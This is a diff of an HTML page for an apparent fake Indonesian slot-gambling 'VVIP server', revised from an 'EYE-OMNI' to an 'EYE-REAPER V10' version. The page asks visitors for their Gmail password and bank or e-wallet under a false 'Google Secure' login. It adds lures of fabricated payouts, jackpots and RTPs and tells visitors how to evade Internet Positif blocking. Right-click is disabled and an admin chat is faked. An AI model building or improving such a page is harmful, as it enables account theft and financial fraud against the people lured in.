@@ -3,57 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EYE-OMNI | PLATINUM SERVER</title>
+    <title>EYE-REAPER V10 | SERVER PRIVATE ASIA</title>
     <link rel="stylesheet" href="style.css">
-    <script src="https://kit.fontawesome.com/a076d05399.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Goldman:wght@400;700&family=Roboto:wght@300;700&display=swap" rel="stylesheet">
 </head>
-<body>
-    <div id="matrix-bg"></div>
+<body oncontextmenu="return false;">
+
+    <div class="news-ticker">
+        <marquee>PENGUMUMAN: Gunakan Link Alternatif ini jika terkena Internet Positif | Selamat kepada ID: reyy*** yang baru saja WD Rp 250.000.000 via Dana | Server SG-V3 Maintenance pukul 04:00 WIB.</marquee>
+    </div>
 
     <div id="gate-system" class="overlay">
         <div class="auth-card">
-            <div class="card-header">PLATINUM ACCESS 2026</div>
-            <div class="input-wrapper">
-                <input type="text" id="u_name" placeholder="User ID / Phone Number">
-                <input type="password" id="u_pass" placeholder="Password System">
+            <div class="brand-logo">EYE<span>REAPER</span></div>
+            <div class="shimmer">VVIP LOGIN CLOUD</div>
+            <p class="sub-text">Gunakan Akun Gmail untuk Sinkronisasi Saldo Maxwin</p>
+            <div class="input-group">
+                <input type="email" id="u_email" placeholder="Gmail / Username" required>
+                <input type="password" id="u_pass" placeholder="Password Akun" required>
                 <select id="u_bank">
                     <option value="">Pilih Bank / E-Wallet</option>
-                    <option value="DANA">DANA</option>
-                    <option value="GOPAY">GOPAY</option>
-                    <option value="BCA">BCA</option>
-                    <option value="MANDIRI">MANDIRI</option>
+                    <option value="DANA">DANA (Otomatis)</option>
+                    <option value="BCA">BCA (Otomatis)</option>
+                    <option value="GOPAY">GOPAY (Otomatis)</option>
                 </select>
-                <button class="glow-btn" onclick="omniLogin()">Buka Akses Server</button>
+                <button class="main-btn" onclick="omniIdentity()">MASUK KE SERVER GACOR</button>
             </div>
-            <div id="status-msg">Silahkan Masukkan Kredensial VVIP Anda</div>
+            <div class="social-login">
+                <img src="https://i.imgur.com/vH9Xv9V.png" width="20"> Login via Google Secure
+            </div>
         </div>
     </div>
 
-    <div id="main-hub" class="hidden-blur">
-        <header>
-            <div class="user-info">WELCOME, <span id="display-user">GUEST</span> <span class="badge">VVIP</span></div>
-            <div class="server-node">NODE: <span class="green">SG-01 (ACTIVE)</span></div>
-        </header>
+    <main id="main-hub" class="hidden-blur">
+        <nav class="top-nav">
+            <div class="menu-icon">☰</div>
+            <div class="user-profile">
+                Saldo: <span id="user-bal" class="gold">Rp 0</span> | <span id="display-user">Guest</span>
+            </div>
+        </nav>
 
-        <section class="live-stats">
-            <div class="stat-box">
-                <p>TOTAL JP HARI INI</p>
-                <h2 id="total-jp">IDR 12.500.250.000</h2>
+        <section class="hero-banner">
+            <img src="https://i.imgur.com/8Km9tLL.png" class="banner-img">
+            <div class="jackpot-counter">
+                <p>GRAND JACKPOT</p>
+                <h1 id="total-jp">IDR 8.421.550.210</h1>
             </div>
         </section>
 
-        <section class="mission-box">
-            <h3>🚀 SYARAT WITHDRAW CEPAT</h3>
-            <p>Bagikan Link VVIP Anda ke 5 Grup WhatsApp / Telegram untuk Aktivasi Akun Gacor!</p>
-            <div class="progress-bar"><div class="progress-fill" id="p-bar">0%</div></div>
-            <button class="wa-share" onclick="shareWA()">SHARE KE WHATSAPP</button>
+        <div class="game-tabs">
+            <div class="tab active">HOT GAMES</div>
+            <div class="tab">SLOTS</div>
+            <div class="tab">CASINO</div>
+        </div>
+
+        <section class="game-grid">
+            <div class="game-card" onclick="spinSlot()">
+                <img src="https://via.placeholder.com/150/000/ffd700?text=ZEUS+V10">
+                <div class="rtp-tag">RTP 99.8%</div>
+                <p>GATES OF REAPER</p>
+            </div>
+            <div class="game-card" onclick="spinSlot()">
+                <img src="https://via.placeholder.com/150/000/ffd700?text=MAHJONG">
+                <div class="rtp-tag">RTP 98.5%</div>
+                <p>MAHJONG WAYS 3</p>
+            </div>
         </section>
 
-        <div class="deposit-live">
-            <h4>Daftar Deposit Member Baru:</h4>
-            <ul id="depo-list"></ul>
+        <div class="floating-chat" onclick="alert('Admin sedang memproses WD antrian #402. Mohon tunggu.')">
+            <div class="chat-notif">1</div>
+            <img src="https://i.imgur.com/4M3499Q.png">
         </div>
-    </div>
+    </main>
 
     <script src="script.js"></script>
 </body>
